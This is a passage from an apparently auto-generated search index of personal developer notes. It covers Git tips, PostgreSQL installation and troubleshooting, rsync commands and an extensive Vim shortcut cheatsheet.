dependencies.</p> <p>To remove the <code>master</code> branch:</p> <ol> <li>In your project go to Repository --&gt; Branches.</li> <li>Under Active branches find master.</li> <li>Click the trash can to the right to delete the branch.</li> </ol> </li> </ol>"},{"location":"Dev/Prg/VCS/Git/#add-multiple-pushurls-for-a-given-remoteorignin","title":"Add multiple <code>pushurl</code>s for a given remote(<code>orignin</code>)","text":"<pre><code>git remote set-url --add --push origin git://original/repo.git\ngit remote set-url --add --push origin git://another/repo.git\n</code></pre>"},{"location":"Dev/Prg/VCS/Git/#github-url-shortener","title":"GitHub URL Shortener","text":"<p>Using git.io - a service provided by GitHub to shorten the URLs</p> <p>Note</p> <p>This URL shortener can only be used for GitHub URLs and not for other URLs.</p> <p>Warning</p> <p>You can create only one shortened URL for each URL. You cannot create another shortened URL if that GitHub URL has already been shortened. If you try to shorten the same URL again, it will return the existing shortened URL.</p> <ul> <li> <p>Option 1: Using <code>curl</code> command</p> <p><code>curl -i https://git.io -F \"url=GITHUB_URL\"</code> - outputs url with arbitrary text after last slash</p> <p><code>curl -i https://git.io -F \"url=GITHUB_URL\" -F \"code=CUSTOM_TEXT\"</code> - outputs url with custom text after last slash</p> <p><code>curl -i SHORTENED-URL</code> - to retrieve the complete URL from the shortened URL</p> <p>If you get SSL Error, then pass the <code>--insecure</code> flag along with the command to skip certificate verification.</p> <p>The (un)shortened URL will appear in the <code>Location</code> field of the response header.</p> </li> <li> <p>Option 2: Using following Python scripts</p> <p>To create shortened URL:</p> <pre><code>import requests\n\nurl = 'https://git.io/'\ndata = {'url': 'https://github.com/jimit105/Intro-to-Deep-Learning-with-PyTorch',\n         'code': 'pytorch'}\n\nr = requests.post(url, data=data)\nprint(r.headers.get('Location'))\n\n\"\"\" Output:\nhttps://git.io/pytorch \"\"\"\n</code></pre> <p>If you get <code>SSLError</code> while running the above script, add the parameter <code>verify=False</code> in the <code>requests.post</code> method to skip certificate validation.</p> <p>To retrieve full URL:</p> <pre><code>import requests\n\nr = requests.head('https://git.io/pytorch')\n\nprint(r.headers.get('Location'))\n\n\"\"\" Output:\nhttps://github.com/jimit105/Intro-to-Deep-Learning-with-PyTorch \"\"\"\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/VCS/Git/#deleting-commited-by-mistake-private-data-from-git-repo","title":"Deleting commited by mistake private data from git repo","text":"<ul> <li> \u0423\u0434\u0430\u043b\u044f\u0435\u043c \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u043e \u0437\u0430\u043a\u043e\u043c\u0438\u0447\u0435\u043d\u043d\u044b\u0435 \u043f\u0440\u0438\u0432\u0430\u0442\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435 \u0438\u0437 git \u0440\u0435\u043f\u043e\u0437\u0438\u0442\u043e\u0440\u0438\u044f</li> </ul>"},{"location":"Dev/Prg/VCS/Git/#git-started-guide-by-ztm","title":"Git Started Guide by ZTM","text":""},{"location":"Dev/Prg/VCS/Git/#conventional-commitslink","title":"Conventional Commits(link)","text":"<p>Commit Messages Cheat Sheet(rus) -&gt; link</p>"},{"location":"Dev/Soft/PostgreSQL/","title":"PostgreSQL","text":"<p>Official Website</p> <p>Official Wiki</p>"},{"location":"Dev/Soft/PostgreSQL/#create-and-access-db-using-terminal","title":"Create and access db using terminal","text":"<p><code>createdb 'nameofDatabase'</code> - create a database</p> <p><code>psql 'nameofDatabase'</code> - access the database</p>"},{"location":"Dev/Soft/PostgreSQL/#postgresql-interactive-terminal-useful-commands","title":"PostgreSQL interactive terminal useful commands","text":"<p><code>\\d</code> - list tables</p> <p><code>\\du</code> - list users with roles attributes</p> <p><code>\\dn</code> - list schemas</p> <p><code>\\q</code> - exit database cli</p>"},{"location":"Dev/Soft/PostgreSQL/#installation","title":"Installation","text":""},{"location":"Dev/Soft/PostgreSQL/#linux","title":"Linux","text":"<p>Installation instruction for Debian and Ubuntu based distros</p> <p>Terminal commands to manage postgresql.service(PostgreSQL database server):</p> <pre><code>sudo systemctl start postgresql     # starts the server\nsudo systemctl stop postgresql      # stops it\nsudo systemctl restart postgresql   # restart it\nsudo systemctl status postgresql    # check the server's status\n</code></pre> <p>When it's first installed, PostgreSQL just has the 'postgres' user, and the way to initially enter PostgreSQL is by typing  <code>sudo su - postgres</code> , and then <code>psql</code>. After creating any database, we can create a user with the same name as our current logged in user, to be a database administrator. This way we can just type in <code>psql 'databaseName'</code> from the command line and enter the database without the need of logging in as the 'postgres' user. This can be done with <code>CREATE USER your-user-name-here WITH SUPERUSER;</code>, and we can verify that he was created with <code>\\du</code>. Now we can exit by typing <code>\\q</code> and then <code>exit</code>, and enter our database just with <code>psql 'databaseName'</code>.</p> <p>Lastly, with pgAdmin4 we need to create a connection with the server the first time we use it, and this is done by right-clicking 'Servers' on the left pane, and choosing 'Create' &gt; 'Server'. We give our server a name, and in the 'Connection' tab we type in 'localhost' as the host and press 'Save'.</p>"},{"location":"Dev/Soft/PostgreSQL/#mac","title":"Mac","text":"<ol> <li><code>brew update</code></li> <li><code>brew doctor</code></li> <li><code>brew install postgreSQL</code></li> <li><code>brew services start postgreSQL</code></li> </ol> <p>Troubleshooting:</p> <p>Issue: Homebrew install of Postgresql will not execute successfully. <code>$ brew link postgresql</code>  results in failure due to directory not writable. New version of Homebrew will not allow sudo commands and System Integrity Protection prevents changing permissions.</p> <p>Details: I tried to use homebrew to install postgres and kept running into issues with syslink. When I ran <code>$ brew link postgresql</code>  as homebrew suggested, I kept running into an error that it couldn't be completed because certain folders were not writable. I thought this would be easily remedied by running sudo but unfortunately the most current version of homebrew no longer allows the use of sudo commands due to security risks. My next thought was to my root user and use the macOS GUI interface to change the permissions on this folder because I am not sure how to do this on the terminal. Regardless of being logged in as 'root,' the OS would not let me change the permissions of the folder. I also attempted to use sudo and change the permissions in terminal and it did not work either. After several days of banging my head against the wall try all kinds of things  to find a solution, I discovered that since El Capitan, macOS introduced System Integrity Protection aka 'SIP' or 'rootless.' As it turned out, once I disabled SIP, logged back into 'root' and changed my regular accounts permissions to Read/Write on the problem directories, I was able to go back to my regular account and successfully execute <code>$ brew install postgresql</code>. Now it works.</p> <p>Steps to Resolve: (WARNING! these steps require you to mess with very critical stuff on your computer. it is best to exercise EXTREME caution when performing this and to revert the system back to its secure state at the end)</p> <p>Assuming you currently have postgresql installed through homebrew but unable to link due a scenario like the one mentioned above, here is what I suggest to resolve your issue:</p> <ol> <li>Run <code>$ brew link postgresql</code></li> <li>Write down the directory path that the error says it is not able to write to. (e.g. usr/local/share/man/man7) NOTE: you'll want to actually write this down on paper or take a picture of the screen on your phone because you will not be able to use copy and paste)</li> <li>Enable your 'root' user account if you have not already done so. Apple Support NOTE: make sure to make a really good password for this account and write it down somewhere safe. This is a powerful account and there's no way to recover the password.</li> <li>Disable System Integrity Protection. HowTo.</li> <li>Log into 'root' user account</li> <li>In Finder menu bar select GO &gt; GO TO FOLDER... (CMND + SHFT + G) and type in the path from Step 2.</li> <li>Right-Click/ Cntrl-Click the folder and select Get Info</li> <li>Click the plus sign at the bottom of Sharing &amp; Permissions</li> <li>Add your regular account to the list and change the permission to Read &amp; Write</li> <li>Go back to your regular account, run <code>$ brew uninstall postgresql</code>, then <code>$ brew update</code>  and <code>$ brew doctor</code> . If those are all set run <code>$ brew install postgresql</code>.</li> <li>You should be able to install without any problems now. However, if you run into a linking and permissions problem again, run <code>$ brew link postgresql</code> to figure out the problematic directory and repeat Steps 5 - 10 with whatever other directories are giving you trouble.</li> <li>If everything is up and running properly. It is probably best to at least enable SIP again (instruction in the article linked in Step 4).</li> </ol> <p>(To check that everything is working. I recommend running <code>$ brew services start postgresql</code> then <code>$ createdb 'test'</code>. In my case, it was when I originally tried to run createdb and got \"command not found\" that I realized something was wrong.)</p>"},{"location":"Dev/Soft/PostgreSQL/#windows","title":"Windows","text":"<p>Follow this tutorial</p> <p>The most common issue you will find is this: setting windows path for postgres tools. This means you will just need to set the path correctly for PostgreSQL:</p> <p>Step 1:) Goto Control Panel\\System and Security\\System</p> <p>Step 2:) Click on Advanced system settings</p> <p>Step 3:) Click on environment Variables</p> <p>Step 4:) Select path and select edit</p> <p>Step 5:) click browse and go to the install dir of PostgreSQL and make sure to go into the bin folder (Usually C:\\Program Files\\PostgreSQL\\9.5\\bin)</p> <p>Step 6:) Click Ok on all open windows</p> <p>Step 7:) restart  your command terminal</p>"},{"location":"Dev/Soft/Ranger/","title":"Ranger","text":""},{"location":"Dev/Soft/Rsync/","title":"Rsync","text":"<p>This puts folder A into folder B:</p> <pre><code>rsync -avu --delete \"/home/user/A\" \"/home/user/B\"\n</code></pre> <p>If you want the contents of folders A and B to be the same, put <code>/home/user/A/</code> (with the slash) as the source. This takes not the folder A but all of it's content and puts it into folder B. Like this:</p> <pre><code>rsync -avu --delete \"/home/user/A/\" \"/home/user/B\"\n</code></pre> <ul> <li><code>-a</code> Do the sync preserving all filesystem attributes</li> <li><code>-v</code> run verbosely</li> <li><code>-u</code> only copy files with a newer modification time (or size difference if the times are equal)</li> <li><code>--delete</code> delete the files in target folder that do not exist in the source</li> </ul> <p>Manpage: link</p> <p>Rsync is primarly meant to copy files between different computers, as explained here it can serve the purpose to sync directories as well. So the -z option is interesting to reduce network traffic and thus enhance the performance of an rsync between 2 computers: ( read data from disk -&gt; compress) ===network===&gt; (uncompress-&gt;write to disk) Using -z to sync 2 directories on the same host is a bit silly and waste of cpu cycles as you would get (read data from disk -&gt; compress -&gt; uncompress -&gt; write to disk)</p> <p>! If you use an absolute path in a filter (include/exclude), it's interpreted starting from the root of the synchronization. You aren't excluding a directory in the source, or a excluding a directory in the destination, you're excluding a directory in the tree to synchronize.</p> <p>Thus:</p> <pre><code>rsync -av --delete --progress --exclude \"/folder4/mytestfolder1\" /source/ /destination/\n</code></pre> <p>My Config:</p> <p>First Sync from external SSD to PC:</p> <pre><code>sudo rsync -rv \"/run/media/tms/tsdata/linux/\" \"/home/tms\"\n</code></pre>"},{"location":"Dev/Soft/Vim/","title":"Vim","text":""},{"location":"Dev/Soft/Vim/#vim-essentials","title":"Vim Essentials","text":"<ul> <li>Vimdoc : the online source for Vim documentation</li> <li>Vim Tips Wiki</li> <li>Vi and Vim(StackExchange)</li> </ul>"},{"location":"Dev/Soft/Vim/#vim-cheatsheet","title":"Vim Cheatsheet","text":"<p>Neovim Cheat Sheet fro various keyboard layouts </p> <p> </p> neovim/vim graphical cheat sheet(google sheets)"},{"location":"Dev/Soft/Vim/#vim-shortcuts","title":"Vim Shortcuts","text":"<p>Tip</p> <p>Run <code>vimtutor</code> in a terminal to learn the first Vim commands.</p> <p>Legend:</p> <p>bol - begining of line  \"soft\" bol - first non-whitespace character of line  eol - end of line  \"soft\" eol - last non-whitespace character of line  buffer - content of opened in Vim file  register - Vim's clipboard</p>"},{"location":"Dev/Soft/Vim/#modes","title":"Modes","text":"<p>Normal Mode</p> <ul> <li>Default mode Vim starts in. Key presses don\u2019t insert text into the document.</li> <li>To get back to the mode from other ones:  Esc or Ctrl+[ - back from any mode  v / vv - back from charwise / linewise visual mode </li> </ul> <p>Insert Mode</p> <ul> <li>Typing inserts characters just like a regular text editor.</li> <li>Accessed from normal mode by pressing: i , I , a , A , o , O , c , C or s , S</li> <li> <p>Mode's specific commands:</p> <p>Ctrl+h - delete the character before the cursor  Ctrl+w - delete word before the cursor  Ctrl+j - begin new line  Ctrl+t / Ctrl+d - indent(move right) / de-indent(move left) line one shiftwidth  Ctrl+p / Ctrl+n - insert(auto-complete) previous / next  match before the cursor  Ctrl+r {char} - insert the contents of register {char}  Ctrl+o {command} - Temporarily enter normal mode to issue one normal-mode {command} </p> </li> </ul> <p>Replace Mode</p> <ul> <li>Allows replace existing text by directly typing over it.</li> <li>Accessed from normal mode by pressing: R</li> </ul> <p>Visual Mode</p> <ul> <li>Used to make selections of text, similar to how clicking and dragging with a mouse behaves.</li> <li>Accessed from normal mode by pressing: v , V or Ctrl+q</li> <li> <p>Mode's specific commands:</p> <p>u / U - change marked text to lowercase / uppercase</p> </li> </ul> <p>Command Mode</p> <ul> <li>Has a wide variety of commands and can do things that normal mode can\u2019t do as easily.</li> <li>Accessed by pressing: / , ? or :</li> </ul>"},{"location":"Dev/Soft/Vim/#global","title":"Global","text":"<ul> <li>Ctrl+l - clear Vim's command line</li> <li>q: - show commands history list in a new horisontally-splitted window</li> <li><code>:{command-pattern}</code>Ctrl+d - show {command-pattern}'s available commands</li> <li><code>:map</code> - mapping a key in command mode to a group of commands, e.g. <code>:map de :1,$d^M</code> will delete all lines when using the <code>:de</code> command</li> </ul>"},{"location":"Dev/Soft/Vim/#help","title":"Help","text":"<ul> <li><code>:h</code> (or <code>:help</code>) - help</li> <li>K - jumps to the help for the word under the cursor: neovim help, man page, etc...( qq - to get back to the editor)</li> </ul>"},{"location":"Dev/Soft/Vim/#terminal-related","title":"Terminal Related","text":"<ul> <li><code>:pwd</code> - print working directory</li> <li><code>:!{cmd}</code> - execute a shell command named {cmd}</li> <li><code>:ter</code> - load an inline terminal to new buffer in normal mode; to exit use <code>:bd!</code> or <code>exit</code> command in insert mode</li> </ul>"},{"location":"Dev/Soft/Vim/#options","title":"Options","text":"<ul> <li> <p><code>:set</code> / <code>:set {options}</code> - show / define editor options</p> <p>Some of the commmon {options} are:</p> <p><code>all</code> - display all current vi options  <code>[no]nu</code> - display line numbers  <code>[no]ruler</code> (and optionally <code>rulerformat</code>) - showing line number headers; if you don't want to see the ruler all the time but want to know where you are, use g Ctrl+g <code>[no]wrap</code> - text wrapping  <code>[no]linebreak</code> - line breaking  <code>[no]spell</code> - spellchecking  <code>syntax on/off</code> - syntax highlighting  <code>expandtab</code> - space-tabbing  <code>softtabstop=4</code> - soft tab  <code>shiftwidth=4</code> - indent sizing </p> </li> <li> <p><code>:noremap x \"_x</code> - re-map x command to work with the \"black hole\" register, i.e. to allow deleting characters without copying</p> </li> </ul>"},{"location":"Dev/Soft/Vim/#repeating","title":"Repeating","text":"<ul> <li>{num}{command} - repeat command {num} times</li> <li>&amp; - repeat <code>:s</code> command</li> <li>. - repeat previous change</li> </ul>"},{"location":"Dev/Soft/Vim/#macros","title":"Macros","text":"<ul> <li>q{a-z} - start recording macro named {a-z}</li> <li>q - stop recording macro(after it started with the above command)</li> <li>@{a-z} - replay {a-z} macro</li> <li>@@ - replay the last macro played</li> </ul>"},{"location":"Dev/Soft/Vim/#navigation","title":"Navigation","text":""},{"location":"Dev/Soft/Vim/#argument-list","title":"Argument list","text":"<p>A list of opened files given as arguments to the <code>vim</code> cmd.</p> <ul> <li><code>:ar</code> - print the argument list, with the current file in square brackets</li> <li><code>:[count]N[!]</code> / <code>:[count]n[!]</code> - edit [count] previous / next file + discard any changes to the buffer if <code>[!]</code> is used</li> </ul>"},{"location":"Dev/Soft/Vim/#buffers","title":"Buffers","text":"<p>A buffer is the in-memory text of a file.</p> <ul> <li>Ctrl+^ - switch between two last buffers</li> <li><code>:ls</code> - list all open buffers; focused buffer named with <code>%a</code></li> <li><code>:bf</code>(or <code>:br</code>) / <code>:bl</code> / <code>:bp</code> / <code>:bn</code> / <code>:b#</code> / <code>:b{N}</code> / <code>:b {Name}</code> - switch to first / last / previous / next / alternate(heretofore opened) / {N}'s(as shown by <code>:ls</code>) / {Name}(as shown by <code>:ls</code>) buffer</li> <li><code>:bad [+{lnum}] {file}</code> - add {file} to the buffer list, without loading it, if it wasn't listed yet(and position cursor at {lnum} line)</li> <li><code>:bd</code> / <code>:%bd</code> /  <code>:bd#</code> / <code>:bd{N}</code> / <code>:bd {Name}</code> - unload current / all / alternate(heretofore opened) / {N}'s(as shown by <code>:ls</code>) / {Name}(as shown by <code>:ls</code>) buffer and delete it from the buffer list<ol> <li>to force unload use <code>!</code> after <code>bd</code>; changes are lost in this case</li> <li>in splitted layout that command will also close all windows currently showing the buffer</li> </ol> </li> <li><code>:tab ba</code> - edit all buffers as tabs</li> <li><code>:[range]bufdo[!] {command}</code> - execute {command} in each buffer in the buffer list or only for buffers for which their buffer number is in the <code>[range]</code>; when the current file can't be abandoned and the <code>[!]</code> is not present, the command fails</li> </ul>"},{"location":"Dev/Soft/Vim/#tabs","title":"Tabs","text":"<p>A tab page is a collection of windows.</p> <ul> <li><code>:tabs</code> - list all open tabs</li> <li><code>:tabe</code> or <code>:tabnew</code>  - open new tab</li> <li><code>:tabe {name} / {file}</code> or <code>:tabnew {name} / {file}</code>  - open new tab with name {name} / file {file}</li> <li><code>vim -p file1 file2</code> - run Vim and open file1 and file2 in separate tabs</li> <li>gt / gT  or <code>:tabn</code> / <code>:tabp</code> - move to the next / previous tab</li> <li>{num}gt or <code>:tabm {num}</code> - move to tab number {num}</li> <li><code>:tabm {num}</code> - move current tab to the {num}th position (indexed from 0)</li> <li><code>:tabc</code> - close the current tab and all its windows</li> <li><code>:tabo</code> - close all tabs except for the current one</li> <li><code>:tabdo {command}</code> - run the {command} on all tabs (e.g. <code>:tabdo q</code> - closes all opened tabs)</li> </ul>"},{"location":"Dev/Soft/Vim/#windows","title":"Windows","text":"<p>A window is a viewport on a buffer.</p> <ul> <li>Ctrl+w n or <code>:sp n</code> - create a new horizontal split and start editing an empty file in it</li> <li>Ctrl+w s or <code>:sp</code> / Ctrl+w v or <code>:vert sp</code> - create a horizontal / vertical split</li> <li>{num}Ctrl+w ^ - create a horizontal split and edit the alternate / {num} buffer</li> <li>Ctrl+w c or <code>:clo</code> - close focused split window, i.e. doesn't close not-splitted window</li> <li>Ctrl+w q - quit a window</li> <li> <p>{num}Ctrl+w o or <code>:{num}on[!]</code> - close(force close if <code>!</code> is used) all but the current / {num} window </p> </li> <li> <p>{win_num}Ctrl+w x - exchange current window with next / {win_num} window</p> </li> <li>Ctrl+w r - rotate windows downwards/rightwards; this only works within the row or column of windows that the current window is in</li> <li>Ctrl+w R - rotate windows upwards/leftwards; this only works within the row or column of windows that the current window is in</li> <li> <p>Ctrl+w T - move the current split window into its own tab </p> </li> <li> <p>Ctrl+w = - make all windows equal height &amp; width</p> </li> <li>{num}Ctrl+w - / {num}Ctrl+w + or <code>:{win_num}res [+-]{num}</code> - decrease / increase current(or {win_num}) window height by 1 / {num}</li> <li>{num}Ctrl+w &lt; / {num}Ctrl+w &gt; or <code>:vert {win_num}res [+-]{num}</code> - decrease / increase current(or {win_num}) window width by 1 / {num}</li> <li> <p>Ctrl+w _ / Ctrl+w | - set current window height / width to highest / widest possible </p> </li> <li> <p>{num}Ctrl+w w - move cursor to next / {num} window</p> </li> <li>Ctrl+w h / Ctrl+w l - move cursor to the left /right window (vertical split)</li> <li>Ctrl+w j / Ctrl+w k - move cursor to the window below / above (horizontal split)</li> <li>Ctrl+w t / Ctrl+w b - move cursor to top-left / bottom-right window</li> <li>Ctrl+w p - move cursor to previous (last accessed) window</li> <li> <p>Ctrl+w P - move cursor to preview window; when there is no preview window this is an error </p> </li> <li> <p>Ctrl+w H / Ctrl+w L - make current window full height at far left(leftmost) / right(rightmost) vertical window</p> </li> <li> <p>Ctrl+w J / Ctrl+w K - make current window full width at the very bottom(bottommost) / top(topmost) horizontal window </p> </li> <li> <p><code>:[range]windo {commad}</code> - execute {commad} in each / <code>[range]</code> window(s)</p> </li> </ul>"},{"location":"Dev/Soft/Vim/#screen","title":"Screen","text":"<ul> <li>Ctrl+f / b ( or Shift+Up / Down or Page Up / Page Down ) - move pages up / down</li> <li>Ctrl+u / d - move up / down 1/2 a screen</li> <li>Ctrl+e / y - scroll line up / down</li> <li>zt , zz , zb - scroll cursor to top, center, bottom</li> </ul>"},{"location":"Dev/Soft/Vim/#folding","title":"Folding","text":"<ul> <li>{num}zF - create a fold for {num} lines</li> <li><code>:{range}fo</code> - create a fold for the lines in {range}</li> <li>zo / zO - open fold(s) by one / all level(s) under the cursor</li> <li>zc / zC - close fold(s) by one / all level(s) under the cursor</li> <li><code>:{range}foldo[!]</code> / <code>:{range}foldc[!]</code> - open / close folds in {range} by one or all(when <code>[!]</code> is used) level(s)</li> <li>za / zA - toggle one / all fold(s) under the cursor</li> <li>zv - view cursor line: open just enough folds to make the line in which the cursor is located not folded</li> <li>zr / zR - reduce(open) all folds by one / all level(s)</li> <li>zm / zM - fold more(close) all folds by one / all level(s)</li> <li>zi - toggle folding functionality(inverts foldenable setting)  Following commands only work when foldmethod set to \"manual\" or \"marker\":</li> <li>zd / zD - delete one fold(nested folds are moved one level up) / all folds at the cursor</li> <li>zE - eliminate all folds in the window</li> </ul>"},{"location":"Dev/Soft/Vim/#marks-and-positions","title":"Marks and positions","text":"<ul> <li><code>:marks</code> - list of marks</li> <li> <p>m{a/A-z/Z} - set a mark {a/A-z/Z}; {a-z} - per buffer marks, {A-Z} - global marks </p> </li> <li> <p><code>:ju</code> - list of jumps</p> <p>Note</p> <p>Jump - a command that normally moves the cursor several lines away.  If you make the cursor jump the position of the cursor before the jump is remembered.  Junp commands are: ` , ' , g, G , L , M , H , ( , ) , { , } , [[ , ]] , % , <code>/</code> , <code>?</code> , n , N , <code>:s</code> , <code>:tag</code> and the commands that start editing a new file.</p> </li> <li> <p>Ctrl+o / Ctrl+i (or Tab ) - move cursor to older(backwards) / newer(forward) position in jump list </p> </li> <li> <p><code>:changes</code> - list of changes</p> </li> <li>g; / g, - move cursor to older(backwards) / newer(forward) position in change list</li> </ul>"},{"location":"Dev/Soft/Vim/#motion","title":"Motion","text":"<p>Note</p> <p>Motion - move the cursor, or define the range for an operator.</p> <ul> <li> <p>`{mark} / '{mark} - move the cursor to {mark} / \"soft\" bol of {mark}</p> <p>Special marks:</p> <p>` / ' - position / \"soft\" bol of position before the last jump  . - position of the last change in this file  \" - position when last editing this file  0 - position where Vim was previously exited </p> </li> <li> <p>( / ) - move the cursor backwards to the beginning of the current(if cursor is not at the first letter of the sentence) or next sentence / forward to the beginning of the next sentence</p> </li> <li>{ / } - move the cursor to the previous / next empty line, i.e. to previous / next paragraph(or function/block, when editing code)</li> <li>[z / ]z - move cursor to the start / end of the current open fold</li> <li>zj / zk - move cursor downwards / upwards to the start / end of the next / previous fold</li> <li>gd / gD - move cursor to local / global variable declaration</li> <li>H , M , L - move the cursor to the top, middle, bottom line on screen</li> <li>gg (or [[ ) / G (or ]] ) - move the cursor first / last line of the file</li> <li> <p>:{num} or {num}gg or {num}G - move the cursor to line {num} of the file </p> </li> <li> <p>h , j , k , l (or Left , Down , Up , Right ) - move the cursor left, down, up, right</p> </li> <li>gj / gk - move the cursor down / up in multi-line text</li> <li>w ( or Shift+Right ) / W ( or Ctrl+Right ) - move cursor to begining of next word / whitespace-separated segment of text</li> <li>b ( or Shift+Left ) / B ( or Ctrl+Left ) - move cursor to previous begining of word / whitespace-separated segment of text</li> <li>e / E - move the cursor to end of word / whitespace-separated segment of text</li> <li> <p>ge / gE - move the cursor to end of previous word / whitespace-separated segment of text </p> </li> <li> <p>% - move the cursor to matching parenthesis, bracket or brace</p> </li> <li>f{char} / F{char} - move the cursor to the next / previous instance of {char}</li> <li>t{char} / T{char} - move the cursor till the next / previous instance of {char}</li> <li>; - repeat f , F , t , T commands</li> <li> <p>, - reverse f , F , t , T commands </p> </li> <li> <p>0 or | - bol of current line</p> </li> <li>^ or _ - \"soft\" bol of current line</li> <li>$ - eol of current line</li> <li>g_ - \"soft\" eol of current line</li> <li>+ or Enter - \"soft\" bol of next line</li> <li>- - \"soft\" bol of previous line </li> </ul> <p>Search in all windows for current screen: <ul> <li> <p><code>/{pattern}</code> / <code>?{pattern}</code> - forward / reverse search for {pattern}</p> <p>Note</p> <p>Regular expressions:</p> <p>Both Vim\u2019s find(<code>/</code>, <code>?</code>) and replace functions accept regular expressions.  Characters assumed by Vim as part of regular expression(must be escaped with <code>\\</code> to be searched for literally): <code>(</code>, <code>)</code>,  <code>*</code>,  <code>.</code>, <code>^</code>, <code>$</code>  Regular expression patterns that interpreted literally(must be escaped with <code>\\</code> to be used as a part of a regular expression): <code>+</code></p> <p>{\\pattern} - \"very magic\" pattern:</p> <p>Non-alphanumeric characters are interpreted as special regex symbols (no escaping needed), e.g. <code>/\\a</code> - search for alphabetic character: [A-Za-z]. For more info search help: <code>:h magic</code></p> <p>Ignoring case:</p> <p><code>\\c</code> in searching and replacing commands - can be placed anywhere in the sequence being searched for and affects the whole sequence</p> <ol> <li>cgn - change next match</li> <li><code>/{pattern}/m$</code> - move first match line to the last line of the document(doesn't seem to work)</li> </ol> </li> <li> <p><code>/\\&lt;{word}\\&gt;</code> - find the next occurrence of the word {word}, where {word} is bounded by word</p> </li> <li>* / # - search forward / backwards for the next instance of the identifier(word) under the cursor</li> <li>g* / g# - search forward / backwards for the next instance(including nested in other word) of the identifier(word) under the cursor</li> <li>n / N - repeats the last search in the same / opposite direction specified by the last use of * , # , / , ? (the last two are command mode motion commands) boundaries (ex. space, dash)</li> </ul> <p>Search in multiple file(wether in current screen or not): <ul> <li><code>:vim /{pattern}/ {file 1} {file 2} ...</code> - search for {pattern} in files {file 1}, {file 2} etc.</li> <li><code>:cp</code> / <code>:cn</code> - move cursor to the previous / next match</li> <li><code>:cope</code> - open a window containing the list of matches</li> <li><code>:ccl</code> - close the quickfix window</li> </ul> <p>2 last commands are not motions!</p>"},{"location":"Dev/Soft/Vim/#selecting","title":"Selecting","text":"<ul> <li>v - visual : marks starting selection point, then move the cursor to the desired end selection point</li> <li>V - linewise-visual : always select full lines</li> <li>Ctrl+q - block-visual : select any rectangular region</li> <li>upon selecting one can use various operators</li> <li><code>:noh</code> - un-highlight search matches</li> </ul>"},{"location":"Dev/Soft/Vim/#editing","title":"Editing","text":"<ul> <li>i - insert at cursor</li> <li>a - append after cursor</li> <li>I - insert at the beginning of the line</li> <li>A - append at the end of the line</li> <li>gi - insert text in the same position as where insert mode was stopped last time in the current buffer</li> <li>o - insert a line below the current line</li> <li>O - insert a line above the current line</li> <li><code>:ab</code> - define a text abbreviation in insert node, e.g. <code>:ab VIM Vi Improved</code> will auto-complete \"VIM\" in insert mode for the phrase \"Vi Improved\" them to the clipboard  {abbreviation}Ctrlv - to disable auto-completion and type the {abbreviation} as is</li> <li><code>:[range] norm A{text}</code> - add {text} on each eol within the [range]; <code>A</code> is just an example, other commands could be used instead</li> <li><code>:[range]folddoc {cmd}</code> / <code>:[range]foldd {cmd}</code> - execute {cmd} on all lines(or lines in <code>[range]</code>) that are / are not in a closed fold. Example: <code>:foldd s/end/loop_end/ge</code> (note the use of the <code>e</code> flag to avoid getting an error message where \"end\" doesn't match)</li> <li> <p><code>:r {file}</code> - insert {file} content at the current cursor position </p> </li> <li> <p>~ - toggle case of character beneath the cursor</p> </li> <li>r - replace a character at the cursor position</li> <li>R - replace characters starting at the cursor position using overstrike cursor, which types over existing characters</li> <li>J - joins the current line with the next one, or all the lines in the current visual selection with one space in between</li> <li> <p>gJ - joins the current line with the next one, or all the lines in the current visual selection without space in between </p> </li> <li> <p>p - put : to paste after (if charwise, to the right; if linewise, below)</p> </li> <li>P (or p[ ) - put : to paste before (if charwise, to the left; if linewise, above)</li> <li>gp , gP - same as p , P + leave cursor after the new text(if charwise) or at the bigining of next line(if linewise)</li> <li>Shift+Ins - paste from system PRIMARY clipboard</li> <li> <p>Ctrl+Shift+v - paste from system CLIPBOARD clipboard </p> </li> <li> <p>u - undo the previous operation</p> </li> <li>U - restore (undo) last changed line</li> <li>Ctrl+r - redo last undo change</li> </ul>"},{"location":"Dev/Soft/Vim/#diff-mode","title":"Diff mode","text":"<p>Diff - showing differences between 2 to 8 versions of the same file.</p> <ul> <li> <p><code>nvim -d file1 file2 [file3 [file4]]</code> - cmd command to start editing in diff mode using vertical split    The second and following arguments may also be a directory name.  Vim will then append the file name of the first argument to the directory name to find. the file.    Use <code>-o</code> argument for horizontal split.</p> </li> <li> <p><code>:diffs {file}</code> / <code>:vert diffs {file}</code> - start diff mode for the current and the newly opened window for {file} in horizontal / vertical split layout</p> <p>Tip</p> <p>If you always prefer a vertical split include \"vertical\" in diffopt.</p> </li> <li> <p><code>:difft</code> - make current window part of diff windows</p> </li> <li><code>:diffo[!]</code> - switch off diff mode for the current window and, when <code>!</code> is used, in all windows in the current tab page where diff is set(hidden buffers are also removed from the list of diff'ed buffers in this case)</li> <li><code>:dif[!]</code> - update the diff highlighting and folds; if the <code>!</code> is included Vim will check if the file was changed externally and needs to be reloaded</li> <li>[c / ]c - move cursor to start of previous / next change</li> <li>{bufspec(count)}do or <code>:[range]diffg [bufspec]</code> - obtain(get) difference(from other buffer)</li> <li>{bufspec(count)}dp or <code>:[range]diffpu [bufspec]</code> - put difference(to other buffer)</li> <li> <p>Note</p>  In 2 comands above:  bufspec argument specifies the buffer to be used and can be a buffer number, a pattern for a buffer name or a part of a buffer name.   If bufspec is omitted the other buffer which is in diff mode is used. But for the second command there should be only one such buffer(where modifiable is set), otherwise it fails. </li> </ul>"},{"location":"Dev/Soft/Vim/#registers","title":"Registers","text":"<p>Tip</p> <p>Registers are being stored in ~/.viminfo, and will be loaded again on next restart of Vim.</p> <ul> <li>\"{char} - select from register the {char} register before a yank/delete/put commands, e.g. \"aY - copy rest of line to register a<ol> <li>\"{A-Z} before yank/delete - append-copy to register {a-z}</li> <li>following {chars} are special registers:  <code>0</code> - last yank  <code>\"</code> - unnamed register, last delete or yank  <code>%</code> - current file name  <code>#</code> - alternate file name  <code>*</code> - X11 PRIMARY(data copied upon highlighting with mouse) clipboard contents  <code>+</code> - X11 CLIPBOARD(traditional windows-like) clipboard contents  <code>/</code> - last search pattern  <code>:</code> - last command-line  <code>.</code> - last inserted text  <code>-</code> - last small (less than a line) delete  <code>=</code> - expression register  <code>_</code> - black hole register </li> </ol> </li> </ul>"},{"location":"Dev/Soft/Vim/#replacing","title":"Replacing","text":"<ul> <li> <p><code>:[range]s/{old}/{new}/[flags]</code> - replace {old} with {new} in range according to 